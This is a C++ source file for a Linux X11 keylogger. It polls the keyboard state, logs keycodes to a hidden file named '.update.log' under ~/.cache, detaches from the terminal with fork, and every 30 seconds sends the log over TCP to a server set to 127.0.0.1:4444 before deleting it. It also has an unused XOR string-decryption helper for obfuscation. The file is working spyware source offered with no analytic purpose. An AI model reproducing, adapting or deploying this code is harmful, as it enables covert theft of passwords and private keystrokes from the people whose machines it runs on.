#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <string>
#include <filesystem>
#include <vector>

#include <X11/Xlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// XOR string decryption
std::string decrypt(const std::vector<uint8_t>& enc, uint8_t key) {
    std::string result;
    for (auto c : enc) result += (char)(c ^ key);
    return result;
}

std::string get_log_path() {
    const char* home = getenv("HOME");
    if (!home) home = "/tmp";  // fallback
    return std::string(home) + "/.cache/.update.log";  // stealthy
}

void write_log(const std::string& text) {
    std::ofstream log(get_log_path(), std::ios::app);
    log << text;
    log.flush();
}

void keylogger() {
    Display* display = XOpenDisplay(nullptr);
    if (!display) return;
    char keys[32];

    while (true) {
        XQueryKeymap(display, keys);
        for (int i = 0; i < 32; ++i) {
            for (int j = 0; j < 8; ++j) {
                if (keys[i] & (1 << j)) {
                    int keycode = i * 8 + j;
                    write_log("[" + std::to_string(keycode) + "]");
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    XCloseDisplay(display);
}

bool send_log_file(const std::string& server_ip, int port) {
    std::ifstream file(get_log_path(), std::ios::binary);
    if (!file.is_open()) return false;

    file.seekg(0, std::ios::end);
    size_t filesize = file.tellg();
    file.seekg(0);

    char* buffer = new char[filesize];
    file.read(buffer, filesize);
    file.close();

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return false;

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        delete[] buffer;
        return false;
    }

    send(sockfd, buffer, filesize, 0);
    close(sockfd);
    delete[] buffer;

    std::filesystem::remove(get_log_path());
    return true;
}

void exfil_loop(const std::string& server_ip, int port) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(30));  // for testing
        send_log_file(server_ip, port);
    }
}

int main() {
    std::this_thread::sleep_for(std::chrono::seconds(5));  // runtime delay

    if (fork()) return 0;  // detach

    std::thread(keylogger).detach();
    exfil_loop("127.0.0.1", 4444);  // loopback test
    return 0;
}
